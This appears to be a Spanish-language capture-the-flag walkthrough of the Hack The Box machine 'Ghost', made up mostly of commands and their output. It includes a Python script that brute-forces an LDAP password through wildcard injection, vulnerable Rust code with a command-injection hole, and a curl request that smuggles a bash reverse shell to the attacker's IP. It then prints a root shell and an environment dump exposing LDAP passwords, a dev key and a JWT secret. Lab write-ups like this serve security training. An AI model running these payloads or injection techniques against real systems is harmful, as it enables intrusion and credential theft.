---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of Copy of Ghost

<figure><img src="../../.gitbook/assets/Ghost.png" alt="" width="563"><figcaption></figcaption></figure>

***



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.24 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 18:54 CET
Initiating SYN Stealth Scan at 18:54
Scanning 10.10.11.24 [65535 ports]
Completed SYN Stealth Scan at 18:56, 127.33s elapsed (65535 total ports)
Nmap scan report for 10.10.11.24
Host is up, received user-set (0.053s latency).
Scanned at 2025-02-07 18:54:34 CET for 127s
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8008/tcp  open  http             syn-ack ttl 127
8443/tcp  open  https-alt        syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49443/tcp open  unknown          syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
51066/tcp open  unknown          syn-ack ttl 127
51123/tcp open  unknown          syn-ack ttl 127
57044/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 127.43 seconds
           Raw packets sent: 131132 (5.770MB) | Rcvd: 177 (10.228KB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.24
	[*] Open ports: 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49669,49675,51066,51123,57044

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389,49443,49664,49669,49675,51066,51123,57044 10.10.11.24 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 18:59 CET
Nmap scan report for 10.10.11.24
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-07 18:00:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.24:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-02-07T18:02:20+00:00; +26s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.24:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-07T17:46:39
|_Not valid after:  2055-02-07T17:46:39
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-07T18:02:21+00:00; +27s from scanner time.
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-02-06T17:43:29
|_Not valid after:  2025-08-08T17:43:29
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2025-02-07T18:01:41+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-generator: Ghost 5.78
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51066/tcp open  msrpc         Microsoft Windows RPC
51123/tcp open  msrpc         Microsoft Windows RPC
57044/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 26s, deviation: 0s, median: 25s
| smb2-time: 
|   date: 2025-02-07T18:01:41
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   99.71 ms 10.10.16.1
2   99.92 ms 10.10.11.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.54 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```





<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb
```



```bash
❯ whatweb http://ghost.htb
http://ghost.htb [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.11.24], Microsoft-HTTPAPI[2.0], Title[Not Found]

❯ whatweb http://ghost.htb:8008
http://ghost.htb:8008 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.24], MetaGenerator[Ghost 5.78], Open-Graph-Protocol[website], Script[application/ld+json], Title[Ghost], X-Powered-By[Express], nginx[1.18.0]

❯ whatweb https://ghost.htb:8443
https://ghost.htb:8443 [302 Found] Cookies[connect.sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], RedirectLocation[/login], X-Powered-By[Express], nginx[1.18.0]
https://ghost.htb:8443/login [200 OK] Cookies[connect.sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[connect.sid], IP[10.10.11.24], Title[Ghost Core], X-Powered-By[Express], nginx[1.18.0]
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb 
```



<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep ghost.htb
10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb gitea.ghost.htb
```



<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



INTRANET



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat users.txt
kathryn.holland
cassandra.shelton
robert.steeves
florence.ramirez
justin.bradley
arthur.boyd
beth.clark
charles.gray
jason.taylor
intranet_principal
gitea_temp_principal
```



<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>



```python
import string
import requests

# Configuración
url = 'http://intranet.ghost.htb:8008/login'
headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

# Caracteres a probar (puedes ampliar si el login acepta mayúsculas o símbolos)
charset = string.ascii_lowercase + string.digits  
password = ""

while True:
    found = False
    for char in charset:
        test_password = f"{password}{char}*"

        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, test_password),
            '0': (None, '[{},"$K1"]')
        }

        r = requests.post(url, headers=headers, files=files)

        if r.status_code == 303:  # Código de redirección indica login exitoso
            password += char
            print(f"[✔] Caracter encontrado: {char} → {password}")
            found = True
            break  # Salir del loop de caracteres y probar el siguiente

    if not found:
        print(f"[✅] Contraseña encontrada: {password}")
        break  # Si ningún carácter fue válido, finaliza

print(f"[🔓] Contraseña final: {password}")
```



```bash
❯ python3 brute_ldap.py
[✔] Caracter encontrado: s → s
[✔] Caracter encontrado: z → sz
[✔] Caracter encontrado: r → szr
[✔] Caracter encontrado: r → szrr
[✔] Caracter encontrado: 8 → szrr8
[✔] Caracter encontrado: k → szrr8k
[✔] Caracter encontrado: p → szrr8kp
[✔] Caracter encontrado: c → szrr8kpc
[✔] Caracter encontrado: 3 → szrr8kpc3
[✔] Caracter encontrado: z → szrr8kpc3z
[✔] Caracter encontrado: 6 → szrr8kpc3z6
[✔] Caracter encontrado: o → szrr8kpc3z6o
[✔] Caracter encontrado: n → szrr8kpc3z6on
[✔] Caracter encontrado: l → szrr8kpc3z6onl
[✔] Caracter encontrado: q → szrr8kpc3z6onlq
[✔] Caracter encontrado: f → szrr8kpc3z6onlqf
[✅] Contraseña encontrada: szrr8kpc3z6onlqf
[🔓] Contraseña final: szrr8kpc3z6onlqf
```



<figure><img src="../../.gitbook/assets/4571_vmware_kSUg7eN36b.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>



dockerfile

<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>

docker-compose-yml

<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>

posts-public.js

<figure><img src="../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://ghost.org/docs/content-api/" %}

<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>

posts-public.js

<figure><img src="../../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/4583_vmware_semX0MY3Ll.png" alt=""><figcaption></figcaption></figure>



/proc/self/environ

/proc/self/environ es un archivo especial en sistemas Linux que contiene las variables de entorno del proceso que lo lee. Detalles clave:

```
Se encuentra en el sistema de archivos proc (/proc/), que es una interfaz al kernel.
self es un enlace simbólico al directorio del proceso que lo accede.
Contiene las variables de entorno en formato KEY=VALUE, separadas por \0 (carácter nulo).
```

Ejemplo de uso:

Si ejecutamos:

cat /proc/self/environ

Veremos algo como:

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0HOME=/root\0USER=root\0...

(Algunos valores pueden no verse bien porque están separados por \0).

Para verlo más claro:

tr '\0' '\n' < /proc/self/environ

Esto mostrará cada variable en una línea. ¿Para qué sirve?

```
Inspeccionar variables de entorno del proceso actual.
Depuración o debugging.
Puede ser útil en exploits, ya que podría exponer credenciales o configuraciones sensibles.
```

Posibles riesgos

Si un proceso con permisos elevados expone su /proc/self/environ, un atacante podría leer variables sensibles como AWS\_SECRET\_KEY, DATABASE\_PASSWORD, etc.



<figure><img src="../../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>



intranet

<figure><img src="../../.gitbook/assets/imagen (28).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (29).png" alt=""><figcaption></figcaption></figure>



```bash
❯ unzip intranet.zip; cd intranet
```



```bash
❯ tree
.
├── backend
│   ├── Cargo.lock
│   ├── Cargo.toml
│   ├── diesel.toml
│   ├── Dockerfile
│   ├── migrations
│   │   ├── 2024-01-05-214725_news
│   │   │   ├── down.sql
│   │   │   └── up.sql
│   │   └── 2024-01-05-225610_forum
│   │       ├── down.sql
│   │       └── up.sql
│   └── src
│       ├── api
│       │   ├── dev
│       │   │   └── scan.rs
│       │   ├── dev.rs
│       │   ├── forum.rs
│       │   ├── ldap.rs
│       │   ├── login.rs
│       │   ├── me.rs
│       │   ├── news.rs
│       │   └── users.rs
│       ├── api.rs
│       ├── database
│       │   ├── models.rs
│       │   └── schema.rs
│       ├── database.rs
│       └── main.rs
├── docker-compose.yml
├── frontend
│   ├── Dockerfile
│   ├── next.config.js
│   ├── package.json
│   ├── postcss.config.js
│   ├── public
│   │   ├── next.svg
│   │   └── vercel.svg
│   ├── README.md
│   ├── src
│   │   ├── app
│   │   │   ├── (dashboard)
│   │   │   │   ├── forum
│   │   │   │   │   └── page.tsx
│   │   │   │   ├── layoutNavigation.tsx
│   │   │   │   ├── layout.tsx
│   │   │   │   ├── news
│   │   │   │   │   └── page.tsx
│   │   │   │   ├── profile
│   │   │   │   │   └── page.tsx
│   │   │   │   └── users
│   │   │   │       └── page.tsx
│   │   │   ├── globals.css
│   │   │   ├── layout.tsx
│   │   │   ├── login
│   │   │   │   ├── action.tsx
│   │   │   │   ├── form.tsx
│   │   │   │   └── page.tsx
│   │   │   ├── logout
│   │   │   │   └── route.tsx
│   │   │   └── page.tsx
│   │   ├── components
│   │   │   ├── drawer.tsx
│   │   │   └── navbar.tsx
│   │   ├── helpers
│   │   │   └── fetch.ts
│   │   └── hooks
│   │       └── useUser.tsx
│   ├── tailwind.config.js
│   ├── tsconfig.json
│   └── yarn.lock
└── README.md

23 directories, 50 files
```



```bash
❯ grep 'DEV_INTRANET_KEY' -r *
backend/src/api/dev.rs:                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
backend/.env.example:DEV_INTRANET_KEY=
```



{% code title="dev.rs" %}
```rust
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```
{% endcode %}



{% code title="scan.rs" %}
```rust
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```
{% endcode %}



<figure><img src="../../.gitbook/assets/imagen (30).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"http://gzzcoo.com;/bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1"}'
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.24] 49786
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# hostname -I
hostname -I
172.18.0.3 
```



```bash
root@36b733906694:/app# env
SHELL=bash
DATABASE_URL=./database.sqlite
HOSTNAME=36b733906694
PWD=/app
HOME=/root
CARGO_HOME=/usr/local/cargo
LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb
LDAP_HOST=ldap://windows-host:389
LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j
TERM=xterm
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
RUSTUP_HOME=/usr/local/rustup
ROCKET_ADDRESS=0.0.0.0
SHLVL=3
RUST_VERSION=1.79.0
PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JWT_SECRET=*xopkAGbLyg9bK_A
_=/usr/bin/env
```















